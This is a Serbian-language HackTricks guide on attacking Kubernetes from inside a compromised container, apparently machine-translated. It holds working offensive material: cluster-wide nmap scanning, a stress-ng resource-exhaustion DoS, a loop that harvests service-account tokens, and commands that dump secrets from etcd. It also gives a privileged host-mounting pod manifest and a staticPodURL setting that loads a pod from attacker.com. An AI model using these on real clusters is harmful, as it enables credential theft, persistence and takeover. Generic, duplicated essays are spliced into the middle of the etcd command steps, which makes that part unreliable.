# Napad na Kubernetes iznutra kontejnera

<details>

<summary><strong>Nau캜ite hakovanje AWS-a od nule do heroja sa</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Drugi na캜ini podr코ke HackTricks-u:

* Ako 쬰lite da vidite **va코u kompaniju reklamiranu na HackTricks-u** ili **preuzmete HackTricks u PDF formatu** proverite [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)!
* Nabavite [**zvani캜ni PEASS & HackTricks swag**](https://peass.creator-spring.com)
* Otkrijte [**The PEASS Family**](https://opensea.io/collection/the-peass-family), na코u kolekciju ekskluzivnih [**NFT-ova**](https://opensea.io/collection/the-peass-family)
* **Pridru쬴te se** 游눫 [**Discord grupi**](https://discord.gg/hRep4RUj7f) ili [**telegram grupi**](https://t.me/peass) ili me **pratite** na **Twitter-u** 游냕 [**@carlospolopm**](https://twitter.com/carlospolopm)**.**
* **Podelite svoje hakovanje trikove slanjem PR-ova na** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repozitorijume.

</details>

## **Bekstvo iz kontejnera**

**Ako imate sre캖e, mo쬯a 캖ete mo캖i da pobegnete iz njega na 캜vor:**

![](https://sickrov.github.io/media/Screenshot-161.jpg)

### Bekstvo iz kontejnera

Da biste poku코ali da pobegnete iz kontejnera, mo쬯a 캖ete prvo morati da **pove캖ate privilegije**, neke tehnike za to su:

{% embed url="https://book.hacktricks.xyz/linux-hardening/privilege-escalation" %}

Mo쬰te proveriti ove **docker bekstve da biste poku코ali da pobegnete** iz kontejnera koji ste kompromitovali:

{% embed url="https://book.hacktricks.xyz/linux-hardening/privilege-escalation/docker-breakout" %}

### Zloupotreba privilegija u Kubernetes-u

Kao 코to je obja코njeno u odeljku o **enumeraciji Kubernetes-a**:

{% content-ref url="kubernetes-enumeration.md" %}
[kubernetes-enumeration.md](kubernetes-enumeration.md)
{% endcontent-ref %}

Obi캜no se kontejneri pokre캖u sa **tokenom servisnog naloga** unutar njih. Ovaj servisni nalog mo쬰 imati neke **privelegije pridru쬰ne** koje biste mogli **zloupotrebiti** da biste se **premestili** na druge kontejnere ili 캜ak **pobegli** na konfigurisane 캜vorove unutar klastera. Pogledajte kako u:

{% content-ref url="abusing-roles-clusterroles-in-kubernetes/" %}
[abusing-roles-clusterroles-in-kubernetes](abusing-roles-clusterroles-in-kubernetes/)
{% endcontent-ref %}

### Zloupotreba privilegija u oblaku

Ako se kontejner pokre캖e unutar **oblaka**, mo쬯a 캖ete mo캖i da **procurite token sa metapodatkovnog endpointa** i pove캖ate privilegije koriste캖i ga.

## Pretraga ranjivih mre쬹ih servisa

Kako se nalazite unutar Kubernetes okru쬰nja, ako ne mo쬰te da pove캖ate privilegije zloupotrebom trenutnih privilegija kontejnera i ne mo쬰te da pobegnete iz kontejnera, trebali biste **pretra쬴ti potencijalno ranjive servise**.

### Servisi

**U tu svrhu, mo쬰te poku코ati da dobijete sve servise Kubernetes okru쬰nja:**
```
kubectl get svc --all-namespaces
```
Podrazumevano, Kubernetes koristi ravnu mre쬹u 코emu, 코to zna캜i da **bilo koji pod/servis unutar klastera mo쬰 komunicirati sa drugima**. **Namespace-ovi** unutar klastera **podrazumevano nemaju nikakva ograni캜enja mre쬹e sigurnosti**. Svako u namespace-u mo쬰 komunicirati sa drugim namespace-ovima.

### Skeniranje

Slede캖i Bash skript (preuzet sa [Kubernetes radionice](https://github.com/calinah/learn-by-hacking-kccn/blob/master/k8s\_cheatsheet.md)) 캖e instalirati i skenirati IP opsege kubernetes klastera:
```bash
sudo apt-get update
sudo apt-get install nmap
nmap-kube ()
{
nmap --open -T4 -A -v -Pn -p 80,443,2379,8080,9090,9100,9093,4001,6782-6784,6443,8443,9099,10250,10255,10256 "${@}"
}

nmap-kube-discover () {
local LOCAL_RANGE=$(ip a | awk '/eth0$/{print $2}' | sed 's,[0-9][0-9]*/.*,*,');
local SERVER_RANGES=" ";
SERVER_RANGES+="10.0.0.1 ";
SERVER_RANGES+="10.0.1.* ";
SERVER_RANGES+="10.*.0-1.* ";
nmap-kube ${SERVER_RANGES} "${LOCAL_RANGE}"
}
nmap-kube-discover
```
Pogledajte slede캖u stranicu da biste saznali kako mo쬰te **napasti specifi캜ne Kubernetes usluge** kako biste **ugrozili druge podove/celo okru쬰nje**:

{% content-ref url="pentesting-kubernetes-services.md" %}
[pentesting-kubernetes-services.md](pentesting-kubernetes-services.md)
{% endcontent-ref %}

### Snifovanje

U slu캜aju da **ugro쬰ni pod pokre캖e neku osetljivu uslugu** gde drugi podovi moraju da se autentifikuju, mo쬯a 캖ete mo캖i da dobijete pristupnim podacima koji se 코alju iz drugih podova **snifovanjem lokalnih komunikacija**.

## Mre쬹o falsifikovanje

Podrazumevano, tehnike poput **ARP falsifikovanja** (i zahvaljuju캖i tome **DNS falsifikovanja**) funkcioni코u u Kubernetes mre쬴. Zatim, unutar poda, ako imate **NET\_RAW mogu캖nost** (koja je podrazumevano dostupna), mo캖i 캖ete da 코aljete prilago캠ene mre쬹e pakete i izvodite **MitM napade putem ARP falsifikovanja na sve podove koji se izvr코avaju na istom 캜voru.**\
Osim toga, ako se **zlonamerni pod** izvr코ava na **istom 캜voru kao DNS server**, mo캖i 캖ete izvesti **DNS falsifikovanje napada na sve podove u klasteru**.

{% content-ref url="kubernetes-network-attacks.md" %}
[kubernetes-network-attacks.md](kubernetes-network-attacks.md)
{% endcontent-ref %}

## Node DoS

U Kubernetes manifestima nema specifikacije resursa i **nema primenjenih ograni캜enja** za kontejnere. Kao napada캜, mo쬰mo **iskoristiti sve resurse na kojima se izvr코ava pod/deployment** i iscrpeti druge resurse, 코to mo쬰 izazvati DoS za okru쬰nje.

To se mo쬰 uraditi pomo캖u alata kao 코to je [**stress-ng**](https://zoomadmin.com/HowToInstall/UbuntuPackage/stress-ng):
```
stress-ng --vm 2 --vm-bytes 2G --timeout 30s
```
Mo쬰te primetiti razliku dok pokre캖ete `stress-ng` i nakon toga.
```bash
kubectl --namespace big-monolith top pod hunger-check-deployment-xxxxxxxxxx-xxxxx
```
## Post-eksploatacija 캜vora

Ako ste uspeli da **iza캠ete iz kontejnera**, prona캖i 캖ete neke zanimljive stvari na 캜voru:

* Proces **Container Runtime** (Docker)
* Vi코e **pods/kontejnera** koji se izvr코avaju na 캜voru koje mo쬰te zloupotrebiti kao ovaj (vi코e tokena)
* Ceo **fajl sistem** i **operativni sistem** uop코te
* Slu코anje usluge **Kube-Proxy**
* Slu코anje usluge **Kubelet**. Proverite konfiguracione fajlove:
* Direktorijum: `/var/lib/kubelet/`
* `/var/lib/kubelet/kubeconfig`
* `/var/lib/kubelet/kubelet.conf`
* `/var/lib/kubelet/config.yaml`
* `/var/lib/kubelet/kubeadm-flags.env`
* `/etc/kubernetes/kubelet-kubeconfig`
* Ostali **uobi캜ajeni fajlovi Kubernetes-a**:
* `$HOME/.kube/config` - **Korisni캜ka konfiguracija**
* `/etc/kubernetes/kubelet.conf`- **Redovna konfiguracija**
* `/etc/kubernetes/bootstrap-kubelet.conf` - **Konfiguracija za pokretanje**
* `/etc/kubernetes/manifests/etcd.yaml` - **etcd konfiguracija**
* `/etc/kubernetes/pki` - **Klju캜evi Kubernetes-a**

### Pronala쬰nje kubeconfig fajla 캜vora

Ako ne mo쬰te prona캖i kubeconfig fajl na jednom od prethodno navedenih puteva, **proverite argument `--kubeconfig` procesa kubelet**:
```
ps -ef | grep kubelet
root        1406       1  9 11:55 ?        00:34:57 kubelet --cloud-provider=aws --cni-bin-dir=/opt/cni/bin --cni-conf-dir=/etc/cni/net.d --config=/etc/kubernetes/kubelet-conf.json --exit-on-lock-contention --kubeconfig=/etc/kubernetes/kubelet-kubeconfig --lock-file=/var/run/lock/kubelet.lock --network-plugin=cni --container-runtime docker --node-labels=node.kubernetes.io/role=k8sworker --volume-plugin-dir=/var/lib/kubelet/volumeplugin --node-ip 10.1.1.1 --hostname-override ip-1-1-1-1.eu-west-2.compute.internal
```
### Ukradi tajne

Da biste ukrali tajne unutar Kubernetes klastera, mo쬰te koristiti nekoliko tehnika:

1. **Pro캜itajte tajne iz API servera**: Koristite API za pristup tajnama koje su sa캜uvane u Kubernetes klasteru. Mo쬰te koristiti `kubectl` komandu ili API klijent za pristup tajnama.

2. **Istra쬴te konfiguraciju**: Pregledajte konfiguracijske datoteke i manifeste kako biste prona코li tajne. Ove datoteke mogu sadr쬬vati osetljive informacije kao 코to su lozinke, klju캜evi API-ja ili sertifikati.

3. **Istra쬴te podatke u skladi코tu**: Proverite da li postoje osetljivi podaci sa캜uvani u skladi코tu podataka, kao 코to su baze podataka ili objektni skladi코ta. Mo쬰te koristiti alate kao 코to su `kubectl exec` ili `kubectl port-forward` za pristup podacima unutar kontejnera.

4. **Istra쬴te mre쬿**: Analizirajte mre쬹i saobra캖aj unutar klastera kako biste prona코li tajne. Mo쬰te koristiti alate kao 코to su `tcpdump` ili `Wireshark` za snimanje i analizu mre쬹og saobra캖aja.

Va쬹o je napomenuti da je kra캠a tajni ilegalna i mo쬰 imati ozbiljne pravne posledice. Ove tehnike se trebaju koristiti samo u okviru zakona i eti캜kih smernica.
```bash
# Check Kubelet privileges
kubectl --kubeconfig /var/lib/kubelet/kubeconfig auth can-i create pod -n kube-system

# Steal the tokens from the pods running in the node
# The most interesting one is probably the one of kube-system
ALREADY="IinItialVaaluE"
for i in $(mount | sed -n '/secret/ s/^tmpfs on \(.*default.*\) type tmpfs.*$/\1\/namespace/p'); do
TOKEN=$(cat $(echo $i | sed 's/.namespace$/\/token/'))
if ! [ $(echo $TOKEN | grep -E $ALREADY) ]; then
ALREADY="$ALREADY|$TOKEN"
echo "Directory: $i"
echo "Namespace: $(cat $i)"
echo ""
echo $TOKEN
echo "================================================================================"
echo ""
fi
done
```
Skripta [**can-they.sh**](https://github.com/BishopFox/badPods/blob/main/scripts/can-they.sh) automatski 캖e **dobiti tokene drugih podova i proveriti da li imaju tra쬰nu dozvolu** (umesto da vi gledate jedan po jedan):
```bash
./can-they.sh -i "--list -n default"
./can-they.sh -i "list secrets -n kube-system"// Some code
```
### Privilegovani DaemonSetovi

DaemonSet je **pod** koji 캖e biti **pokrenut** na **svim 캜vorovima klastera**. Dakle, ako je DaemonSet konfigurisan sa **privilegovanim servisnim nalogom**, na **SVIM 캜vorovima** 캖ete mo캖i prona캖i **token** tog **privilegovanog servisnog naloga** koji biste mogli zloupotrebiti.

Eksploatacija je ista kao i u prethodnom odeljku, ali sada ne zavisite od sre캖e.

### Prelazak na Cloud

Ako je klaster upravljan od strane cloud servisa, obi캜no **캜vor 캖e imati druga캜iji pristup metadata endpointu** od Pod-a. Stoga, poku코ajte **pristupiti metadata endpointu sa 캜vora** (ili iz pod-a sa hostNetwork postavljenim na True):

{% content-ref url="kubernetes-pivoting-to-clouds.md" %}
[kubernetes-pivoting-to-clouds.md](kubernetes-pivoting-to-clouds.md)
{% endcontent-ref %}

### Kra캠a etcd-a

Ako mo쬰te specificirati [**nodeName**](https://kubernetes.io/docs/tasks/configure-pod-container/assign-pods-nodes/#create-a-pod-that-gets-scheduled-to-specific-node) 캜vora na kojem 캖e se pokrenuti kontejner, dobijte shell unutar kontrolne ta캜ke 캜vora i preuzmite **etcd bazu podataka**:
```
kubectl get nodes
NAME                STATUS   ROLES    AGE   VERSION
k8s-control-plane   Ready    master   93d   v1.19.1
k8s-worker          Ready    <none>   93d   v1.19.1
```
Kontrolni 캜vorovi imaju ulogu **mastera** i u **upravljanim klasterima u oblaku ne캖ete mo캖i pokrenuti ni코ta na njima**.

#### 캛itanje tajni iz etcd-a

Ako mo쬰te pokrenuti svoj pod na kontrolnom 캜voru koriste캖i selektor `nodeName` u specifikaciji poda, mo쬰te lako pristupiti bazi podataka `etcd`, koja sadr쬴 sve konfiguracije klastera, uklju캜uju캖i sve tajne informacije.

U nastavku je brz i prljav na캜in za dobijanje tajnih informacija iz `etcd`-a ako se pokre캖e na kontrolnom 캜voru na kojem se nalazite. Ako 쬰lite elegantnije re코enje koje pokre캖e pod sa `etcd` klijentskim alatom `etcdctl` i koristi akreditive kontrolnog 캜vora za povezivanje sa etcd-om, bez obzira gde se on izvr코ava, pogledajte [ovaj primer manifesta](https://github.com/mauilion/blackhat-2019/blob/master/etcd-attack/etcdclient.yaml) od @mauilion.

**Proverite da li se `etcd` izvr코ava na kontrolnom 캜voru i vidite gde se nalazi baza podataka (Ovo je na klasteru kreiranom pomo캖u `kubeadm`-a)**
```
root@k8s-control-plane:/var/lib/etcd/member/wal# ps -ef | grep etcd | sed s/\-\-/\\n/g | grep data-dir
```
# Napad na Kubernetes iznutra kontejnera

U Kubernetes okru쬰nju, kada se nalazite unutar kontejnera, postoji nekoliko na캜ina da izvr코ite napad na sam Kubernetes klaster. Ovi napadi se mogu izvesti kroz razli캜ite ranjivosti i slabosti u konfiguraciji klastera.

## 1. Napad na API server

API server je centralni deo Kubernetes klastera i omogu캖ava komunikaciju izme캠u razli캜itih komponenti klastera. Napad na API server mo쬰 biti izvr코en kroz razli캜ite metode kao 코to su:

- Kori코캖enje kradenih ili kompromitovanih tokena za autentifikaciju
- Iskori코캖avanje ranjivosti u verziji API servera
- Kori코캖enje privilegija kontejnera za pristup API serveru

## 2. Napad na mre쬿 klastera

Kubernetes klaster koristi mre쬿 za komunikaciju izme캠u razli캜itih komponenti. Napad na mre쬿 klastera mo쬰 biti izvr코en kroz razli캜ite metode kao 코to su:

- Snimanje mre쬹og saobra캖aja unutar klastera radi presretanja osetljivih podataka
- Iskori코캖avanje ranjivosti u mre쬹oj konfiguraciji klastera
- Kori코캖enje ARP spoofinga za preusmeravanje mre쬹og saobra캖aja

## 3. Napad na resurse klastera

Kubernetes klaster koristi resurse kao 코to su CPU, memorija i skladi코te za izvr코avanje kontejnera. Napad na resurse klastera mo쬰 biti izvr코en kroz razli캜ite metode kao 코to su:

- Iskori코캖avanje slabosti u konfiguraciji resursa klastera radi preoptere캖enja sistema
- Kori코캖enje privilegija kontejnera za pristup i menjanje resursa klastera
- Kori코캖enje ranjivosti u sistemu za upravljanje resursima klastera

## 4. Napad na druge kontejnere

U Kubernetes klasteru, kontejneri dele isti host i mre쬿. Napad na druge kontejnere mo쬰 biti izvr코en kroz razli캜ite metode kao 코to su:

- Kori코캖enje ranjivosti u kontejnerima za izvr코avanje napada na druge kontejnere
- Kori코캖enje privilegija kontejnera za pristup i manipulaciju drugim kontejnerima
- Kori코캖enje slabosti u izolaciji kontejnera za presretanje osetljivih podataka

## 5. Napad na host sistem

Kubernetes klaster deli host sistem sa kontejnerima. Napad na host sistem mo쬰 biti izvr코en kroz razli캜ite metode kao 코to su:

- Kori코캖enje ranjivosti u host sistemu za pristup i manipulaciju hostom
- Kori코캖enje privilegija kontejnera za pristup host sistemu
- Kori코캖enje slabosti u izolaciji host sistema za presretanje osetljivih podataka

## 6. Napad na druge servise

Kubernetes klaster mo쬰 imati i druge servise koji nisu deo samog klastera. Napad na druge servise mo쬰 biti izvr코en kroz razli캜ite metode kao 코to su:

- Kori코캖enje ranjivosti u drugim servisima za izvr코avanje napada
- Kori코캖enje privilegija kontejnera za pristup i manipulaciju drugim servisima
- Kori코캖enje slabosti u konfiguraciji drugih servisa za presretanje osetljivih podataka
```bash
data-dir=/var/lib/etcd
```
**Pregledajte podatke u etcd bazi podataka:**

```bash
kubectl exec -it <pod_name> -- sh
ETCDCTL_API=3 etcdctl get --prefix "" --keys-only --from-key / --cacert /var/run/secrets/kubernetes.io/serviceaccount/ca.crt --cert /var/run/secrets/kubernetes.io/serviceaccount/tls.crt --key /var/run/secrets/kubernetes.io/serviceaccount/tls.key | grep -v '\/$'
```

Ovom komandom mo쬰te pregledati podatke u etcd bazi podataka. Zamijenite `<pod_name>` sa imenom ciljanog poda.
```bash
strings /var/lib/etcd/member/snap/db | less
```
**Izvucite tokene iz baze podataka i prika쬴te ime servisnog naloga**
```bash
db=`strings /var/lib/etcd/member/snap/db`; for x in `echo "$db" | grep eyJhbGciOiJ`; do name=`echo "$db" | grep $x -B40 | grep registry`; echo $name \| $x; echo; done
```
**Ista komanda, ali sa nekoliko grepa da bi se vratio samo podrazumevani token u kube-system namespace-u**
```bash
db=`strings /var/lib/etcd/member/snap/db`; for x in `echo "$db" | grep eyJhbGciOiJ`; do name=`echo "$db" | grep $x -B40 | grep registry`; echo $name \| $x; echo; done | grep kube-system | grep default
```
# Napad na Kubernetes iznutra kontejnera

U Kubernetes okru쬰nju, kada se nalazite unutar kontejnera, postoji nekoliko na캜ina da izvr코ite napad na sam Kubernetes klaster. Ovi napadi se mogu izvesti kroz razli캜ite ranjivosti i slabosti u konfiguraciji klastera.

## 1. Napad na API server

API server je centralni deo Kubernetes klastera i omogu캖ava komunikaciju izme캠u razli캜itih komponenti. Napad na API server mo쬰 biti izvr코en kroz razli캜ite metode kao 코to su:

- Kori코캖enje kradenih ili kompromitovanih tokena za autentifikaciju
- Iskori코캖avanje ranjivosti u verziji API servera
- Kori코캖enje privilegija kontejnera za pristup API serveru

## 2. Napad na mre쬿

Kubernetes klaster koristi mre쬿 za komunikaciju izme캠u razli캜itih komponenti. Napad na mre쬿 mo쬰 biti izvr코en kroz razli캜ite metode kao 코to su:

- Snimanje mre쬹og saobra캖aja unutar klastera
- Iskori코캖avanje ranjivosti u mre쬹oj konfiguraciji klastera
- Kori코캖enje ARP spoofinga za presretanje mre쬹og saobra캖aja

## 3. Napad na skladi코te podataka

Kubernetes koristi skladi코te podataka za 캜uvanje informacija o klasteru. Napad na skladi코te podataka mo쬰 biti izvr코en kroz razli캜ite metode kao 코to su:

- Kori코캖enje privilegija kontejnera za pristup skladi코tu podataka
- Iskori코캖avanje ranjivosti u konfiguraciji skladi코ta podataka
- Kori코캖enje SQL injekcije za pristup podacima u skladi코tu

## 4. Napad na druge kontejnere

U Kubernetes klasteru, kontejneri mogu biti izvr코eni na istom 캜voru i deliti iste resurse. Napad na druge kontejnere mo쬰 biti izvr코en kroz razli캜ite metode kao 코to su:

- Kori코캖enje privilegija kontejnera za pristup drugim kontejnerima
- Iskori코캖avanje ranjivosti u konfiguraciji kontejnera
- Kori코캖enje napada na memoriju za pristup podacima drugih kontejnera

## 5. Napad na host sistem

Kada se nalazite unutar kontejnera, imate mogu캖nost da izvr코ite napad na host sistem. Napad na host sistem mo쬰 biti izvr코en kroz razli캜ite metode kao 코to su:

- Kori코캖enje privilegija kontejnera za pristup host sistemu
- Iskori코캖avanje ranjivosti u konfiguraciji host sistema
- Kori코캖enje napada na operativni sistem za pristup host sistemu

## Zaklju캜ak

Napadi na Kubernetes klaster iznutra kontejnera mogu biti izvr코eni kroz razli캜ite ranjivosti i slabosti u konfiguraciji klastera. Va쬹o je da administratori klastera preduzmu odgovaraju캖e mere za코tite kako bi spre캜ili ove napade i odr쬬li sigurnost klastera.
```
1/registry/secrets/kube-system/default-token-d82kb | eyJhbGciOiJSUzI1NiIsImtpZCI6IkplRTc0X2ZP[REDACTED]
```
### Stati캜ka/Mirrored Pods upornost

_Stati캜ki Pods_ se upravljaju direktno od strane kubelet demona na odre캠enom 캜voru, bez nadgledanja API servera. Za razliku od Pods koji se upravljaju kontrolnom ravni (na primer, Deployment); umesto toga, **kubelet nadgleda svaki stati캜ki Pod** (i ponovo ga pokre캖e ako ne uspe).

Stoga, stati캜ki Pods su uvek **vezani za jedan Kubelet** na odre캠enom 캜voru.

**kubelet automatski poku코ava da kreira Mirror Pod na Kubernetes API serveru** za svaki stati캜ki Pod. Ovo zna캜i da su Podovi koji se izvr코avaju na 캜voru vidljivi na API serveru, ali se ne mogu kontrolisati odatle. Imena Podova 캖e biti sufiksirana sa imenom 캜vora sa vode캖im crticom.

{% hint style="danger" %}
**`spec` stati캜kog Pod-a ne mo쬰 se odnositi na druge API objekte** (npr. ServiceAccount, ConfigMap, Secret, itd. Dakle, **ne mo쬰te zloupotrebiti ovu funkcionalnost da biste pokrenuli Pod sa proizvoljnim serviceAccount-om** na trenutnom 캜voru kako biste kompromitovali klaster. Ali mo쬰te koristiti ovo da biste pokrenuli Podove u razli캜itim namespace-ima (ako je to korisno iz nekog razloga).
{% endhint %}

Ako se nalazite unutar 캜vora doma캖ina, mo쬰te ga naterati da kreira **stati캜ki Pod unutar sebe**. Ovo je veoma korisno jer vam mo쬰 omogu캖iti da **kreirate Pod u drugom namespace-u** kao 코to je **kube-system**.

Da biste kreirali stati캜ki Pod, [**dokumentacija je od velike pomo캖i**](https://kubernetes.io/docs/tasks/configure-pod-container/static-pod/). U osnovi, potrebne su vam 2 stvari:

* Konfiguri코ite parametar **`--pod-manifest-path=/etc/kubernetes/manifests`** u **kubelet servisu**, ili u **kubelet konfiguraciji** ([**staticPodPath**](https://kubernetes.io/docs/reference/config-api/kubelet-config.v1beta1/#kubelet-config-k8s-io-v1beta1-KubeletConfiguration)) i ponovo pokrenite servis
* Kreirajte definiciju na **definiciji Pod-a** u **`/etc/kubernetes/manifests`**

**Jo코 jedan na캜in koji je diskretniji bi bio:**

* Izmenite parametar **`staticPodURL`** iz konfiguracione datoteke **kubelet-a** i postavite ne코to poput `staticPodURL: http://attacker.com:8765/pod.yaml`. Ovo 캖e naterati kubelet proces da kreira **stati캜ki Pod** dobijaju캖i **konfiguraciju sa nazna캜ene URL adrese**.

**Primer** konfiguracije **Pod-a** za kreiranje privilegovanih Pod-ova u **kube-system** preuzet sa [**ovde**](https://research.nccgroup.com/2020/02/12/command-and-kubectl-talk-follow-up/):
```yaml
apiVersion: v1
kind: Pod
metadata:
name: bad-priv2
namespace: kube-system
spec:
containers:
- name: bad
hostPID: true
image: gcr.io/shmoocon-talk-hacking/brick
stdin: true
tty: true
imagePullPolicy: IfNotPresent
volumeMounts:
- mountPath: /chroot
name: host
securityContext:
privileged: true
volumes:
- name: host
hostPath:
path: /
type: Directory
```
### Brisanje podova + nepodesivi 캜vorovi

Ako napada캜 **preuzme kontrolu nad 캜vorom** i mo쬰 **brisati podove** sa drugih 캜vorova i **onemogu캖iti izvr코avanje podova na drugim 캜vorovima**, podovi 캖e biti ponovno pokrenuti na preuzetom 캜voru i napada캜 캖e mo캖i **ukrasti token** koji se izvr코ava u njima.\
Za [**vi코e informacija pratite ove veze**](abusing-roles-clusterroles-in-kubernetes/#delete-pods-+-unschedulable-nodes).

## Automatski alati

* [**https://github.com/inguardians/peirates**](https://github.com/inguardians/peirates)
```
Peirates v1.1.8-beta by InGuardians
https://www.inguardians.com/peirates
----------------------------------------------------------------
[+] Service Account Loaded: Pod ns::dashboard-56755cd6c9-n8zt9
[+] Certificate Authority Certificate: true
[+] Kubernetes API Server: https://10.116.0.1:443
[+] Current hostname/pod name: dashboard-56755cd6c9-n8zt9
[+] Current namespace: prd
----------------------------------------------------------------
Namespaces, Service Accounts and Roles |
---------------------------------------+
[1] List, maintain, or switch service account contexts [sa-menu]  (try: listsa *, switchsa)
[2] List and/or change namespaces [ns-menu] (try: listns, switchns)
[3] Get list of pods in current namespace [list-pods]
[4] Get complete info on all pods (json) [dump-pod-info]
[5] Check all pods for volume mounts [find-volume-mounts]
[6] Enter AWS IAM credentials manually [enter-aws-credentials]
[7] Attempt to Assume a Different AWS Role [aws-assume-role]
[8] Deactivate assumed AWS role [aws-empty-assumed-role]
[9] Switch authentication contexts: certificate-based authentication (kubelet, kubeproxy, manually-entered) [cert-menu]
-------------------------+
Steal Service Accounts   |
-------------------------+
[10] List secrets in this namespace from API server [list-secrets]
[11] Get a service account token from a secret [secret-to-sa]
[12] Request IAM credentials from AWS Metadata API [get-aws-token] *
[13] Request IAM credentials from GCP Metadata API [get-gcp-token] *
[14] Request kube-env from GCP Metadata API [attack-kube-env-gcp]
[15] Pull Kubernetes service account tokens from kops' GCS bucket (Google Cloudonly) [attack-kops-gcs-1]  *
[16] Pull Kubernetes service account tokens from kops' S3 bucket (AWS only) [attack-kops-aws-1]
--------------------------------+
Interrogate/Abuse Cloud API's   |
--------------------------------+
[17] List AWS S3 Buckets accessible (Make sure to get credentials via get-aws-token or enter manually) [aws-s3-ls]
[18] List contents of an AWS S3 Bucket (Make sure to get credentials via get-aws-token or enter manually) [aws-s3-ls-objects]
-----------+
Compromise |
-----------+
[20] Gain a reverse rootshell on a node by launching a hostPath-mounting pod [attack-pod-hostpath-mount]
[21] Run command in one or all pods in this namespace via the API Server [exec-via-api]
[22] Run a token-dumping command in all pods via Kubelets (authorization permitting) [exec-via-kubelet]
-------------+
Node Attacks |
-------------+
[30] Steal secrets from the node filesystem [nodefs-steal-secrets]
-----------------+
Off-Menu         +
-----------------+
[90] Run a kubectl command using the current authorization context [kubectl [arguments]]
[] Run a kubectl command using EVERY authorization context until one works [kubectl-try-all [arguments]]
[91] Make an HTTP request (GET or POST) to a user-specified URL [curl]
[92] Deactivate "auth can-i" checking before attempting actions [set-auth-can-i]
[93] Run a simple all-ports TCP port scan against an IP address [tcpscan]
[94] Enumerate services via DNS [enumerate-dns] *
[]  Run a shell command [shell <command and arguments>]

[exit] Exit Peirates
```
* [**https://github.com/r0binak/MTKPI**](https://github.com/r0binak/MTKPI)

<details>

<summary><strong>Nau캜ite hakovanje AWS-a od nule do heroja sa</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Drugi na캜ini podr코ke HackTricks-u:

* Ako 쬰lite da vidite **va코u kompaniju reklamiranu na HackTricks-u** ili **preuzmete HackTricks u PDF formatu** proverite [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)!
* Nabavite [**zvani캜ni PEASS & HackTricks swag**](https://peass.creator-spring.com)
* Otkrijte [**The PEASS Family**](https://opensea.io/collection/the-peass-family), na코u kolekciju ekskluzivnih [**NFT-ova**](https://opensea.io/collection/the-peass-family)
* **Pridru쬴te se** 游눫 [**Discord grupi**](https://discord.gg/hRep4RUj7f) ili [**telegram grupi**](https://t.me/peass) ili **pratite** me na **Twitter-u** 游냕 [**@carlospolopm**](https://twitter.com/carlospolopm)**.**
* **Podelite svoje hakovanje trikove slanjem PR-ova na** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repozitorijume.

</details>
